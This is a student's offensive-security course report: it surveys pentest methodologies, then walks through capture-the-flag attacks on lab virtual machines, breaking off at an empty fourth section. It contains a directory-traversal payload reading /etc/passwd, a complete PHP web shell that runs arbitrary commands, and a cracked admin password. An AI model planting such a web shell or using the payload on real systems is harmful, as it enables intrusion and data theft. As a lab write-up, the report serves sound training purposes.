---
title: "Offensive Security Challenge Report"
author: ["ander.carrera@alumni.mondragon.edu"]
date: "2022-03-14"
subject: "Offensive Security"
keywords: [Offensive Security, Report]
subtitle: "Ander Carrera"
lang: "en"
titlepage: true
titlepage-color: "1E90FF"
titlepage-text-color: "FFFAFA"
titlepage-rule-color: "FFFAFA"
titlepage-rule-height: 2
book: true
classoption: oneside
code-block-font-size: \scriptsize
---
# Offensive Security challenge report

## Introduction

The Offensive Security challenge report It details all of the efforts made in order to pass the Offensive Security exam.
This report will be scored on all parts of the exam for correctness and completeness.
The goal of this report is to guarantee that the student has a thorough understanding of penetration testing methodology as well as the technical knowledge required to pass the Offensive Security exam.

## Objective

The goal of this exam is to conduct an internal penetration test on the network of Offensive Security Exam.
The learner is expected to take a deliberate approach to achieving the objective aims.
This test should be modeled after a real penetration test, from start to finish, including the overall report.
Not only the actual penetration, but also the methodology used, as well as the majority of the often used methodologies, must be explained and analyzed, with the following justification of why the used methodology has been selected

## Requirements

This penetration testing report must be completely filled out by the student, and it must include the following sections:
- Methodologies analysis
- Methodologies selection
- Auditory with the selected methodology
  - Pentesting report

# Methodologies analysis
These are the five most commonly used methodologies out there:

## OSSTMM
OSSTMM (Open Source Security Testing Methodology Manual) provides a methodology for a comprehensive safety test, referred to in this document as an OSSTMM audit. An OSSTMM audit is an accurate measurement of safety at the operational level, which avoids assumptions and anecdotal evidence. [1]

As a methodology, it is designed to be consistent and repeatable. As an open source project, it allows any security testing professional to contribute ideas for more accurate, concrete and efficient security testing. It also allows for the free dissemination of information and intellectual property.

Environments are significantly more complex compared to previous years due to events such as remote operations, virtualization, cloud computing. And also other new types of infrastructure cannot think of performing simple tests only for desktops, servers or routing equipment.

- Therefore, OSSTMM test version 3 covers all human, physical, wireless, telecom and data network channels.
- This also makes it perfectly comfortable for testing cloud computing, virtual infrastructure, messaging middleware, infrastructure and mobile communications.
- And also, high-security locations, human resources, trusted computing and any logical process that covers all channels and requires a different type of security testing.
- A set of attack surface metrics, called ravs, provides a powerful and highly flexible tool that provides a graphical representation of state and shows state changes over time.
- This integrates well with a "dashboard" that is beneficial for internal management and staff. And also external testing, which allows comparison/combination of the two.
- It can perform quantitative risk management of the report with OSSTMM audit findings, providing an improved result due to a free and more accurate results error.

## ISSAF
ISSAF (Information Systems Assessment Framework)
is designed to evaluate your network, system and control applications. It is focused on three phases and nine evaluation steps. [2]

The approach includes the following three phases:

1. Planning and Preparation
2.  Evaluation
3.  Reporting, Cleanup and Object Destruction.

**Planning and Preparation**

This phase comprises the initial steps to exchange information, plan and prepare for the test. Prior to conducting the formal test agreement will be signed by both parties. It forms the basis for this task and mutual legal protection. It will also specify the participation of the team, the exact dates, the times of the test, the escalation of privileges and other arrangements.

The following activities are foreseen in the following phase

1. Identification of contact persons on both sides.
2.  Opening Meeting to identify the scope, approach and methodology, according to test cases, privilege escalation and Paths.

**Evaluation**

This is the phase where the penetration test is performed. The evaluation phase in a layered approach should be followed as shown in the following figure.

1. Information Gathering
2. Network Mapping
3.  Vulnerability identification
4.  Penetration
5.  Gaining access and privilege escalation
6.  Enumeration
7.  Compromising remote users and sites
8.  Maintain Access


[![](http://2.bp.blogspot.com/_NcZQ3njhqn8/SeSxbyfodYI/AAAAAAAAADc/nOW3hjQNfTE/s320/453px-Image001.png)](http://2.bp.blogspot.com/_NcZQ3njhqn8/SeSxbyfodYI/AAAAAAAAADc/nOW3hjQNfTE/s1600-h/453px-Image001.png)


**Reports, Cleanup and Destruction of Objects**

In this phase reports are submitted

In the course of penetration testing in case a critical issue is identified, it should be reported immediately to ensure that the organization is aware of it. At this critical point your expedition should be discussed and countermeasures should be sought to resolve the critical issues identified in the test.

After completion of all test cases defined in the scope of work, a written report describing the detailed results of the tests and examinations should be prepared with recommendations for improvement. The report should follow a well-documented structure. Things that should be included in the report are presented in the following list:

1. Management Summary
2.  Project Scope
3.  Tools used (including Exploits)
4.  Actual dates and times when the system testing was performed
5.  Any and all output from the tests performed (excluding vulnerability scan reports that may be included as attachments).

All information that is created and/or stored on the test systems must be removed from these systems. If these are for some reason not possible to remove from a remote system, all these files (with their location) should be mentioned in the technical report so that the customer and the technical staff would be able to delete these after the report has been received.

## OWASP
**What is OWASP**

OWASP (Open Web Application Security Project) is a worldwide non-profit project that seeks to improve software security in general. To this end, the organization has provided a series of tools and documents that explain the most common security holes in any information system. Needless to say, all OWASP materials are freely available (free of charge) for free consultation and use. [3]

**What exactly are its contents?**

Currently OWASP actually has several projects in which the categories Tool Projects, Code Projects and Documentation Projects stand out. The best known documentation project is the TOP TEN, which lists the 10 most common security risks and how to prevent them. In this top, you will recognize terms such as SQL INJECTION, Cross-Site Scripting (XSS) and Broken Authentication. Without further ado, I leave you with this list of ten security risks or vulnerabilities.

### OWASP Top Ten
![Mapping](https://owasp.org/www-project-top-ten/assets/images/mapping.png)

**A01: 2021 - Broken Access Control (formerly A05 OWASP Top 10 2017)**

Topping the list as the most serious web application security risk, broken access control had 34 CWEs assigned to it. That's more occurrences in applications than in any other category. A web application's access control model is closely related to the content and functions provided by the site. If not configured correctly, hackers can gain access to sensitive files and deface the site.

**A02: 2021 - Cryptographic flaws (formerly A03 OWASP Top 10 2017)**

Cryptanalytic software involves different software programs that are used to decrypt encryptions. Formally called Confidential Data Exposure, a cryptographic flaw means that information that is supposed to be protected from untrusted sources has been disclosed to attackers. Hackers can access information such as credit card processor data or other authentication credentials.

**A03: 2021 - Injection (formerly A01 OWASP Top 10 2017)**

When an attacker uses malicious SQL code to manipulate a backend database to reveal sensitive information, it is called an injection attack. Injection flaws, such as NoSQL, OS, LDAP and SQL injection, occur when untrusted data is sent to an interpreter as part of a command or query.

Cross-Site Scripting (XSS) attacks are another type of injection. Malicious scripts are injected into trusted, benign websites that can rewrite HTML page content.

Server-Side Request Forgery (SSRF) is a type of attack that can occur when a hacker can not only view unauthorized lists, delete tables and have unauthorized administrative access, but also perform remote code execution from the back-end server of a vulnerable web application.

**A04: 2021 - Insecure Design (NEW)**

This is a new category for 2021 and the focus is on risks related to design flaws. More threat models, secure design patterns and principles, and reference architectures are needed to protect against insecure designs for web pages.

This is an important addition because developers must be aware of how design and architectural concepts must be configured and implemented correctly in code. Incorrect implementation of design and architectural concepts in code can create security vulnerabilities.

**A05: 2021 - Security misconfiguration (formerly A06 OWASP Top 10 2017).**

XML external entity attacks have been incorporated into a security misconfiguration this year. It is a growing threat due to more changes in software configurations.

**A06: 2021 - Vulnerable and obsolete components (formerly A09 OWASP Top 10 2017).**

Formerly titled Use of Components with Known Vulnerabilities, this category represents a known issue that OWASP experts have found that many continue to struggle to prove risk assessment.

Many security issues have been attributed to outdated third-party software components. This is compounded by the growing concern that time to exploit is shrinking and organizations are not patching or remediating vulnerabilities fast enough.

**A07: 2021 - Identification and authentication flaws (formerly A02 OWASP Top 10 2017).**

Authentication vulnerabilities as a category have fallen from the second position in the top ten because the increased availability of standardized frameworks seems to be helping. Previously called a broken authentication vulnerability because it can result in a denial of service when user accounts cannot be authenticated. Multifactor authentication is not implemented in most cases. It now includes CWEs that are more related to identification failures.

**A08: 2021 - Data and software integrity failures (NEW)**

As a new category for 2021, focuses on making assumptions related to software upgrades, critical data and CI/CD pipelines without verifying integrity.

**A8: 2017 - Insecure deserialization is now part of this broader category.**

Growing concern over recent attacks associated with the SolarWinds breach and protection of the build environment increases the importance of this threat. Software integrity has been specifically mentioned in the Cybersecurity Executive Order, section 4.

**A09: 2021 - Security tracking and logging flaws (formerly A10 OWASP Top 10 2017).**

This category has been expanded to include more types of flaws that can directly affect visibility, incident alerts and forensics.

**A10: 2021 - Server-side request forgery (NEW).**

Data shows that there is a low incidence rate for this category that was just added to the Top 10.


## PTES
PTES (Penetration Testing Execution Standard) is a standard which provides a common language to be followed by all penetration testing professionals and security assessment professionals. [4]

PTES provides the client with a reference on the security posture so that they are in a better position to perceive the findings obtained during a penetration test.

PTES is designed as the minimum necessary to be performed as part of a complete penetration test. The standard contains many different levels of services, which should be part of advanced penetration testing.

## NIST (NIST SP800-115)
NIST (The National Institute of Standards  and Technology) was published in September 2008 by the U.S. government's National Institute of Standards and Technology (NIST). It describes guidelines on how an Information Security Assessment (ISA) should be conducted and conceptualizes it as the process of determining how effectively an entity is assessed against specific security objectives. It defines as assets and objects of evaluation the servers, data networks, procedures and people. [5]

Three assessment methods can be used to perform ESI:

- **Testing**: It is the process of putting under test one or more evaluation objects under specific conditions to compare actual and expected behavior.
- **Scrutiny**: The process of checking, inspecting, reviewing, observing, studying, or analyzing one or more evaluation objects to facilitate understanding, clarification, or to obtain evidence.
- **Interview**: The process of conducting discussions and exchanges with groups of people with the objective of facilitating understanding, clarification or identifying the location of evidence associated with the objects of evaluation.

The results obtained through the evaluation methods are used to determine the effectiveness of the entity's security controls.

NIST SP 800-115 proposes an ESI process composed of at least three phases:

- **Planning:** Classified as a critical phase for the success of the ESI. It involves gathering information about the assets to be assessed, the threats of interest against those assets, and the security controls that can be used to mitigate those threats.  With the principle that an ESI is a project, a management plan should be established that includes specific goals and objectives, scope, requirements, team roles and responsibilities, constraints, success factors, constraints, resources, task planning and deliverables.
- **Execution:** The main objective of this phase is to identify vulnerabilities and test them according to the established planning. Appropriate assessment methods and techniques should be applied according to the ESI objective.
- **Post-Execution:** Focused on the analysis of the vulnerabilities found to determine the root causes of their presence, establish recommendations for their mitigation and develop the final report.


# Methodologies selection

For this document, one of the methodologies explained above will be selected.

In this case, the cybersecurity audit will be carried out following the PTES methodology, since it is the simplest and has the fewest phases. In addition, it aims to unite the efforts of analysts and security experts to create a standard that can complete an audit in all its most common processes.

Finally, from the 7 steps of this methodology:

1. Pre-engagement Interactions

2. Intelligence Gathering

3. Threat Modeling

4. Vulnerability Analysis

5. Exploitation

6. Post Exploitation

7. Reporting

These will be combined to make only 3 steps to follow in the document:

1. Information Gathering
2. Exploitation
3. Privilege Escalation



# **VM1 - Metasploit - CTF**
## Information Gathering

![](https://lh6.googleusercontent.com/4cr8OPiyXA7i5Twj2nNlslZ-mRjSWwDHi_ma1qGb7BLMRZ2E-xYXYaNefrryayTzVblQfHZFQLvQF7hggD32TlMtDOV2gj0sd4rBKkdD-63gh4_WmFat_pfIgg35Vp7vMQ)


The objective of this exercise is to obtain the flag. To do that you should be able to exploit a vulnerability and to scale privileges (post-explotation).

Download this[ .ova file](https://www.dropbox.com/s/jrttxttxb5imks9/metasploit_ctf.ova?dl=0) (pass: Macc2022) and open it using VirtualBox.

1.- First of all, identify the IP address of the new MV using[ netdiscover](https://kalilinuxtutorials.com/netdiscover-scan-live-hosts-network/).

2.- Having the IP address, use Nmap to identify the services installed in the MV.

We have been able to observe that the ftp service is active. We will check if it is possible to authenticate anonymously.


![](https://lh3.googleusercontent.com/U_9qlRJa0rcp_VaHslxoNGxwCfb9SwIviHgZVd6v3JJ8qCxd7DXTcI3G1fmCRbzRdZGKyAn9ZtSIzsH9-1zdkHPZZIiACdkkTZuGaw38uMuGTFwNo9W7gniahzX8FPs33g)



## Explotation

4.- If it is possible, connect to the server and check if there is something interesting there.


![](https://lh6.googleusercontent.com/sDcnGChqwpSgarrON2YoOAgP4lL5Ct4nvoUeQM_sTjsX0SHkEn5WpcgGRR7sIJz5DwGgecmxDNAkvLofS62JlohH4t6AmZunJPsXUzWHod0Ygk1HrEvQMngc4yCLfsgKgg)


5.- There aren't any interesting files. As we have observed that the http service was active, let's check the web page.


![](https://lh4.googleusercontent.com/DncoRx09vLCcGgGA6iMOfMTqqmKMxKDUB3Rq7NBSVqzB6IjdzbkoBjlBB9o1olzofNeVTzI9ODq-1wzZZLCG0PNUDn2zcZE67HOFd8g0_e9zjOXo5Q0S9bnxUTymymMCsQ)


6.- The website doesn't show anything interesting either. Try dirbuster to see what services it has on the web. You can also use the command:
```shell
dirb http://192.168.56.102
```


7.- In the results you can see interesting applications such as phpmyadmin, cms, drupal...


![](https://lh6.googleusercontent.com/CDPYvhxFVlSgeUQD-UGuMgrtLZFFiILKtYBbIbpsxe2sabuQ-BTWDnwCbJswZvNV7Mq_KEv0f9GdSuARz7tfN2mj1Cf0am_Ni4keYj0NWG_62Unkggk-QESYo9mt7pIOZg)


8.- From now on, we should analyze each of these applications. We'll start with Drupal. Open the Drupal page in the browser.


![](https://lh3.googleusercontent.com/mdabs7v5reXVvcD_Uh6-xFhvlXp2N4y8RzECFoDTXCkwgDMuU02wgpxhpU3m9TZV0NlICdC8Z6AArcwVEPN97BfXhqxZT5bREy8FDzWisfJH8ojHoYHK5wbUOVS8kypy4A)


9.- We need to know the version of drupal to look for exploits.


![](https://lh5.googleusercontent.com/l3BgdKcJH2WL8x_d0-mlorxAWAaqQSGahn7c5PzqrVfBa03JfkJOZNgqDuXGQZCF8coDz0ky0ifZK1ttY8irheNyMpmS1MI3Td2LKZXQzy58tt3yG9GAxIHE8tUCwTp7zA)


10.- Search an exploit for that version of the application. You can use searchsploit or directly metasploit.

11.- Metasploit.

12.- Chose an exploit and start working with it.

13.- Configuration and execution:


![](https://lh4.googleusercontent.com/ebmAhMptNu7OpRFznpGxTQkp45SBwP-4PRjjOk13SgG23HDqxKqVqkNgs3SN0u5y43YrugY-NkTyjBDpNUMPAJaxR5_0go6hUFf4kt0-nXwXJOFL5mxndr8pDn1DXpOVdA)


14.- We're in. Using the[ Meterpreter](https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/) session, the next step is the identification of the operating system and its version.


![](https://lh3.googleusercontent.com/oJep-1frnkYPfd9i2gAzBxtngPfZtVbmZvqJSFvQLs9nUttf4DpbKDaHn91sdbFGgTZJ2mpPUaHEy56U1Y-npxjqQu49hEug8rVOU5uzoysqoABCU_9_VFWB5bKKsYbVWQ)


15.- Is there an exploit that allows us to escalate privileges on that operating system?


![](https://lh3.googleusercontent.com/6oAd3VrPi4WCJECRsdFsXzfd58hw-YvW-mY64R8Odas9Kl50plcPM9mB_l5kBxCSsGiKu_VuO2uKv_1LScHaGgvJcHlF5zeIa2yaVFAD5SZptUrBeQ9kelCnoudSAxVE7Q)


16.- Yes, there is. But you need to run that exploit inside the target machine.Download the exploit and make it available on a server.


![](https://lh6.googleusercontent.com/uYHpxRjh1TxVVk2hUdGikBVJQqoCN71LuURNj5IHfdIuyAg776f-Pbpw0pBFpMcU5fe8QCDFbY9pmCen6a4Zq-CMHixIGZSIzrZgTH3K3uBmrbckaxJzVerRd0Y13H-8mA)


17.- Use wget to download the exploit inside the target machine.


![](https://lh5.googleusercontent.com/e8dsdKDaM9c-pbNsltU6YEkTC1b40L-TQ3FsL2FJyYMKBak2LM_X5UhZHUQ_PLhZUSNL6WsivZN45yp25x4ikrVKRwliARhJ8bAd4a-V42736E8iG2-0qvlhDe4-wzBazA)


18.- Compile and execute the exploit.


![](https://lh4.googleusercontent.com/L9rI0gff87cC2lPDHNZMUkpc2CJ1S0FCjsOOlv2PU_HLcXMQKFbxI6s-xoq3OJvuHGQ3DFIQ6MeMjHG0VFAn18D6oJ9M9ASbeesgzbwjYeqaS5onV48rMqxMKQhBo7-LKQ)



## Privilege Escalation

19.- The flag is in the /root directory. Read it and write the content in a report.


![](https://lh4.googleusercontent.com/Vv8-an3qqumPC7hl4aOkH1PloUBeEac9aTwU5nhCkVM5iT6oa2MqcPtQIRtsVf5Jdcb-gHljp0g6bHwp4CTtFOv1JaSIqBkYLVNmAi824EB6DHEw1MUmWKinkV89WqeMUg)



# VM2 - MU1


## Information Gathering

1.- First of all, identify the IP address of the new MV using[ netdiscover](https://kalilinuxtutorials.com/netdiscover-scan-live-hosts-network/).


![](https://lh6.googleusercontent.com/nhPAkKBd7gcLHZ4YWzfEFxC3GJOa_MlFKOfPqtilKMPM1ryGOEHPqO3xQpM58WVJwf6tNqRBgonHeV3MUT-jXDuJMnI9mjSKwZdUHhbJmLWo59ZIeyKfXibPB62lVvMfaw)



![](https://lh4.googleusercontent.com/rCJRGJnVlw-OBa4yf7Qy4yRFGFoBiXjHlORyuwpZss9cKO3RLRwGoNswCnYoHwIrqCoqDPhx6MoN4G_PDxMVQCoVYdDKOJd7mSiH_-IfnbjeGP_uXHkmIzeKZ18GJZoABXOFmOrN)


Our target IP is **192.168.56.111**

2.- Having the IP address, use Nmap to identify the services and some vulnerabilities installed in the MV.


![](https://lh6.googleusercontent.com/hS6ddDSH9FLYQrPCkVvZBCWXUGs90A8_Vzueqv9H5vJYiv8MNL3ughBWm6z-ERGhEt1HBYy33LVfAoN24yDFrCDjOoVCtvKY1GPrVSXeT36qDiMMOwo5FDmtkNz7B_3Lq3JPXBXL)



![](https://lh3.googleusercontent.com/Jq6o2wKTOgQdjK-45R8o6UzeV3lNo4uvMP8VVUHTf4Iv73rVEZ17IclYRNUxnGf2qEVtVxJ3Y_V5qem9gIlv6Q975ZgqZw4MtzVUVUue_NgEP12hddK0v42mtZtvenATiw)


We don’t have any interesting vulnerability available out there to gain root permissions. So let’s try to attack the available services.


## Exploitation

Let’s try to attack the port 80 where is running a **Apache 2.2.23**.

Let’s investigate about some metadata:


![](https://lh4.googleusercontent.com/_apgFI0V3wPHBgQTn9PVH3_m3rEcl7i78d3db0l2UPznZBRzJaLJrO6wje32MFSdlWM4IrXEZh2a4T-tGwYBihl8CmRfzqW9b3JHAc5UcMtEf3hHoILSZfxNsqOudCZa9g)


We found an interesting service called pChart 2.1.3 with the following path **pChart2.1.3/index.php **

Let’s do a searchsploit of this service:


![](https://lh4.googleusercontent.com/Qvy42gTDwBG8l9ICqQaKdf8vFpyXMruhK5vNOp6NNs5aocjXWyopxsCEIRsyjPFeYLJ6WGR7rdLQSswP8eADB5ytsB9RzE4EAl0gWF40Y4d-pdJh7JPdiWPA9cabQSwSYg)


Reading the exploit with:

```shell
cat /usr/share/exploitdb/exploits/php/webapps/31173.txt_


[0] Summary:

PHP library pChart 2.1.3 (and possibly previous versions) by default

contains an examples folder, where the application is vulnerable to

Directory Traversal and Cross-Site Scripting (XSS).

It is plausible that custom built production code contains similar

problems if the usage of the library was copied from the examples.

The exploit author engaged the vendor before publicly disclosing the

vulnerability and consequently the vendor released an official fix

before the vulnerability was published.

[1] Directory Traversal:

**"hxxp://localhost/examples/index.php?Action=View&Script=%2f..%2f..%2fetc/passwd"**

The traversal is executed with the web server's privilege and leads to

sensitive file disclosure (passwd, siteconf.inc.php or similar),

access to source codes, hardcoded passwords or other high impact

consequences, depending on the web server's configuration.
```


Let’s try the Directory Transversal, and we obtain the following:

Directory transversal is:

_a web security vulnerability that allows an attacker to read arbitrary files on the server_ [6]


![](https://lh6.googleusercontent.com/-HbnQadd8HgOwxt-IcOlg24euOVMBs07JJ4E-1_Ei2iwqNJhUrjx0pulEzS2HeAuQ4U8-QcFkGj9pUWPUJgG_seL1PUl_rOTm14K2a0IL4AKXvnomSHPrkhHpDCKc5IGew)


Knowing this, we can easily obtain the flag by going to /root/flag.txt directory:


![](https://lh3.googleusercontent.com/Nj38kD6nhpr5bHQqYtGthj-d_Vt8bJVi01VSotaIHESRZIMy4tsNUOcdSehDH79hdXUrLs77c1ja82Z4Z18dgkUDcx8vGPYGWmqzyWuWdTDM-ZW4WIJ8x6ENHAzpji6xAw)



## Privilege Escalation

We have been able to get to the server’s files. Now let’s see the source code of the main page and we can see the Apache configuration file location:


![](https://lh4.googleusercontent.com/pIT6z3z1CgURvzm0fmF4sn7mmcZZF357rYvaFe9lPHglBtozsCTOutDPW4WVjk7HcyF_Tu5ba8YsDpOlqubUcGmGsRWJ4xUrtxl5XOX7BlNKQbt_MU4A7_2lmdpX3rQGGw)


Let’s obtain the Apache configuration file by applying the Directory Transversal:


![](https://lh6.googleusercontent.com/Jmb6BBHgO4cQgn8SP8q1HHgYZLlgkVYFV4xTD5JAlnAxERTAcuxrBqpHZFs7Br_RvkLI-pCip742hW5nLURN-SAcRUTnlYm-kWNMvPIIMUoovFBC6oP6ivjVjdb73CBdiA)


Let’s skip the initial default configuration useless text and focus on the last part of the file where the new configuration (juicy & interesting) is set:


![](https://lh6.googleusercontent.com/LJLRzfVyJrS3sjLofurvT9QaShpjkTBPFZrWfbsSAxpWY1_YsO5NOK4XP1bRU9a4ZK9laHfsG6NsDuZXBBW1abMIF33p28CSJS96cQw6Z-s-4qEPAqoA9F-n-G8gFrcIgQ)


We can see that it uses Mozilla/4.0 user-agent in the port 8080.

By definition, “_The User-Agent request header is a character string that lets servers and network peers identify the application, operating system, vendor, and/or version of the requesting user agent”_ [7]

Let’s investigate further. We can try to obtain the User agent info by passing the custom header to the server and see what it returns

```shell
curl -H "User-Agent:Mozilla/4.0" http://192.168.56.111:8080
```



![](https://lh6.googleusercontent.com/xvSezkPuofqiZofXnjbGYpW_-HlgNV43NchMgw0Zs8gjpsO9EPDQ_5vVQccfDwA1hHhl9Gi9Es-brfokYyxpRCiMOjG6Zd8QouoMBAvutHv0TMZbGkIxSJIcSS9mRaEJ_w)


We see an interesting service name called phptax. let’s see whether there is an exploit for this or not.


![](https://lh5.googleusercontent.com/a7tPmc621mAoFY8X9eRA2e78lLbQ_BUPGkgVNpJxtTHeBb8zjzTkSqRuf7rmcCPVjT9GvUSCmswE-7SyBo0Wbjrqu1JAot79hEG5kvgNOYtfVd9XlFE1fLzzizVhYarElw)


**DISCLAIMER: from now on, the target IP has changed to 10.0.2.5**

Let’s open MSF and use the first exploit from above:


![](https://lh5.googleusercontent.com/jJe7HZAnNc6mgmrfEv9haO_eZcTJXxu8wvet2jH9Xl4jy4fK-YLyM_OEdDsLugH54Qny8HgjKTp-3G6NyIgOwZq6-QYOrd_PLTOrdzsL_t3X4yCaN9mn9afsR9nhB2KhIw)


We have seen that it is using FreeBSD. We can use this to escalage privileges.


![](https://lh5.googleusercontent.com/T_xA0PSzblz_ppOMKK71SQzUI4i0SNSQjuW5eGbim6J3LNFtfwwexTlpzEQv1to89_y_mSzL3u-qhylDcoNBKMztQ0Iwq1eJW6mCxOp4XqU04c4v1kySiaz9qbsTFlbnRw)


We download the 28718 exploit and we will pass it through netcat to our target machine:

**Local Machine**


![](https://lh6.googleusercontent.com/8Ed5ceeGQ1Rvg9GmrYX3WvaqagNWjBmT0tcUaysdHt_Xf9NtvQzLKLHfmiACC55V5NTqCG3SbXNbQaSpuOpDekf2aOJs3Cl3Q4lvB5MVfJFKevF1jXHaM4y7j2n7YjpMWQ)


**Target Machine**


![](https://lh5.googleusercontent.com/TJoZnKQRaMcprxRS9xkPXbLNzDYZsMlg9kc3AKY-jnWkSB7Fdtq_jjCRVSdLyemTUkt4ggXhoTlL91POT7Kd7TLh1IygvYwQT3TQ7iFs1WD29ts4sxIlXoYhZmMVmf0mfw)


Once we got our file, we restart the shell and we ensure we have the file:


![](https://lh6.googleusercontent.com/Pv38NEy0P0QtBNXWjrEXBfIzyAzgaTacTqxSA59vxHnfufDoe4T3JnlGnQKDAoGA6cwx2aJh4Bk0Io9_7dRmG4c1XAXGur7uxeIhHDlX1DsAsKOf20YtO18AdEtnzmeU2Q)


Let’s compile it and exploit it.


![](https://lh3.googleusercontent.com/RQ5ZQbNimnAFo30kdo2_05QaE4lzS9l3eWwFc2FxmQ6z2bsRfjTyqOC_NOLK1mcIryuRhpKdSyA86c_EHKgRLPxbh4AGHiNmKZVVw7_bYR5fnoTsRi8V4z6S0NFEphofKw)


Now we are root!




# VM3 - MU2


## Information Gathering

1.- First of all, identify the IP address of the new MV using[ netdiscover](https://kalilinuxtutorials.com/netdiscover-scan-live-hosts-network/).


![](https://lh6.googleusercontent.com/nhPAkKBd7gcLHZ4YWzfEFxC3GJOa_MlFKOfPqtilKMPM1ryGOEHPqO3xQpM58WVJwf6tNqRBgonHeV3MUT-jXDuJMnI9mjSKwZdUHhbJmLWo59ZIeyKfXibPB62lVvMfaw)



![](https://lh5.googleusercontent.com/qSJ-ihnHk3fq0LF8AgElMJv7P3pUgbm9XCV2uqJ3YMKe45Aq1ub8ydcpADZ7fZdTQFMxcnz6m8LIMgcwFa0JTiwG2zbDdtaE8fbTDeWRX5rLkGivb_2VHG4tE5Piunl1pQ)


Our target IP is **192.168.56.112**

2.- Having the IP address, use Nmap to identify the services and some vulnerabilities installed in the MV.


![](https://lh6.googleusercontent.com/QPKVbjHIHx4LepirWvipL1D9__K-7B17mEIyI_H1iW73tI_4JRJbY__HKFqYzqaHwn8ecfppblD6RAqh7iIKtHWgbtaOAC03DueIqYeBNJ3YlSO6hNk9Mp6yQGJzAk5LLQ)



![](https://lh6.googleusercontent.com/7AaAVbyyzS1xj_He0Fcbjvl0lCdzl8mkccerd3JYq-65QCM_tI9h_L8r1cZ9E5eukZtIEC_B1MkdRQ0LahkCrKeA2I--t4XfAnBfzvt0zUwPe3OvpIyC8ydBqG8iqAwg0Q)


We don’t have any interesting vulnerability available out there to gain root permissions. So let’s try to attack the available services.


## Exploitation

We have seen some interesting directories such as **/admin_area**


![](https://lh6.googleusercontent.com/vD80t9GgQ_tDA7SiJld8vJ0PTajJh8DkfzKTzGRjW1nErYzUIDD4JeM1XUIx3IRiWjaMjsqsLOgnUrO9C2gdjtVM1S4LYBH-FLuTd6PJaixHocFpHpXVnMnPUShtvdWdEQ)


We get the following password:

`78f3842f0201c993fec13905f2ff9ec3fdd39056`

We search for this hash in Google and we found this:


![](https://lh5.googleusercontent.com/Zy7_Ccfb1C7iLvlgqSDk7RNfoPFIjpP31-F1scbuQVFJNYHLHJWQjJz4hPgopNsrh-36KwyLsx5jPbJPcHYmPNfNqy2QGn0ig9LUkyZQDbuygAXC1rVodL3anoDDYYZkEQ)


Now we try to enter into the login page:

user: admin

pass: Master


![](https://lh5.googleusercontent.com/-WbacawyXfPR86ph0DMAXqaI12eBeuNYHOwU_bRPuTUKQkkK76O2sl7PkvCE2RxPDR2S9vR2HeWfytWiyho3EE7f46XvDfMrfSZO43G-tIjo3taqt9wRu6tLfFH6D9jiJQVakPH_)


We did it!


![](https://lh5.googleusercontent.com/LESQjpTQqfdaQhb5WjOENeq5dcQK-boslCIPB5o-2AAwUXNzcl_h5XxXIfDQNskJOMurfn1Zwv-IZwgtpoiJPbM9SdvRZlpW9bzCQ2gK5uFQZN907bV6CgtUuhygTXpmpEKtT5d-)


We don’t have much more info, let’s try to get more juicy directories once we have the login credentials, using **dirbuster**:


![](https://lh5.googleusercontent.com/nVx-IRiyQyM6hPb-Nrw6AoLHdBAPqjUgCTnUDNj9FAsOtgXmi9TUwFSiFmsB_6UXM8y99B8kMZFhU0YR_nlmTVj2pK_l0cqVx-_kEPDjU_Yt2u-KClkCmD-m0IptxZHrMg)


No more juicy directories we found…

Let’s try to upload random files to the server to see how if performs.

I will upload a sample.jpg image and check the path

```shell
/uploaded_files/filename 
```

We know this by checking the robots.txt page (obtained with nMap) that htis directory exists.


![](https://lh6.googleusercontent.com/nqOZvp0Yy-MJI9IJZ3Bt1o5TABLrN4VzgBb5WRzfOydJijEGGWbWCJYYSjJU88zO10BThM59No_T3_rVEuBo_Zb9vXVC19rTmxiqQOzeyYjCXVQKjyj-FlnaMC1G1DrllIxoOLm3)



![](https://lh6.googleusercontent.com/_1z4y6VSGXdjq-g3eklqPacG6YyaHF3d9b_qU_zzXWLaIia0owRQyBOdCXqfbmtc4KNU88_VnRXlSwSNvLP4PWvgKKIED0PYibxw8IBboJwt69laNtkxG02AHsQttzkDR4JKLCfG)


We have managed to upload a new image.

I’ll try to upload a php file to see if we are able to execute remote code: I will upload a simple hello world php file:


![](https://lh5.googleusercontent.com/IY9ngqU9R_8YPGDoVKI_Vq8b-nn2crPE4cCvqt_yDAOKv2DKQpx0i-ZUi0vo-xNElZf2XgJackLksfBgZdSLuApVl1rWK5ZkWjSiTb7o-V0kOBgCWomA1apn24GLK2pnY3e6tfX6)


We have seen that we are able to execute remote code in the server. Let’s upload a **webshell.php** file with a backdoor to execute arbitrary code:

```shell
<?php
if (isset($_REQUEST["cmd"])) {
    echo "&lt;pre>";

    $cmd = $_REQUEST["cmd"];

    exec($cmd, $results);

    foreach ($results as $r) {
        echo $r . "&lt;br/>";
    }

    echo "&lt;/pre>";

    die();
} ?>

```







Exploring the directory of the web page we find the file hint.txt that can give us some clue:


![](https://lh4.googleusercontent.com/xjd1EV-TFrFcdPSCPvjBs3zvarCv5Zs4n48EA_7Yd6_sIR10IBYRalT89LW0p_uP4_whoif7UzIn0t0oQ92ZVwS0LY0XwF-3I9ICqBu3Wi6q3sF1n3CY00LMc-yVei_c56J5V0D3)


hint.txt:


![](https://lh6.googleusercontent.com/Dgja1vPA66Yh0RSswUSeFwobA5vpJcfLM6cfk4V44qhd_kV3RT9utExnb7nLOwUkJeVV1GuyAFohliDfPJikGJgzQXTCD2GFD4q0Cz6YSZVRyotbygdt5SUdMVnkuyLFw31vDxeb)


Let’s explore the technawi user’s files:


![](https://lh4.googleusercontent.com/v0a6pZxl1fUYJYmqA5x4qL-JepXS67yCmXhK6LJiCk6dV3fCdr_RxPcgatQfuCEthc1cyMUc7HZo-kGJJ7P90IFlmoT769rqXx1qfJAEri75SowILQ3hhsW94jnon7o_yX1QgwBL)


Let’s try this credentials to access via ssh:


![](https://lh4.googleusercontent.com/5mPhhhtIqpzycyeS-uJijYKfnzSl3_36harSyWZNgnELSBeI6OqhdiZZfAOS9-4R56ZcxYwJzs_DmdikR-knaCr_1znrBslp-WD9AVh4QxNBZ9IxoC2J4V19hmBO_TkNm_oUfcEm)



## Privilege Escalation

As technawi is already in sudoers file, it’s very easy to become root as like this:


![](https://lh6.googleusercontent.com/DiJUKYUff-T-cltokfZU80CphAYaJUUBrsQfiU_yIjUGsilWw93WNFtfcvC0EDYA2Nk9HkozY1RJeMZxcoRZDqmoPrqHB7gm6NgA5B6ni7UQ624mFBB5nyUX75qNthHBhSdzvRBE)



# VM4 - MU3


## Information Gathering


